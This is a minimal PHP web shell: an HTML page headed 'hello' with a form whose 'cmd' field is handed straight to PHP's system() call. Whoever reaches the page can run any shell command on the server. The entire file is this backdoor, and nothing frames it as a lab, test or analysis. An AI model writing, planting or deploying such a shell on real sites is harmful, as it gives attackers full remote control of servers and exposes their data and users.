<h1>hello</h1>
<form method=get action="#">
<input type=text name=cmd />
<input type=submit value=do />
</form>

<?php

if(isset($_GET['cmd'])) system($_GET['cmd']);

?>
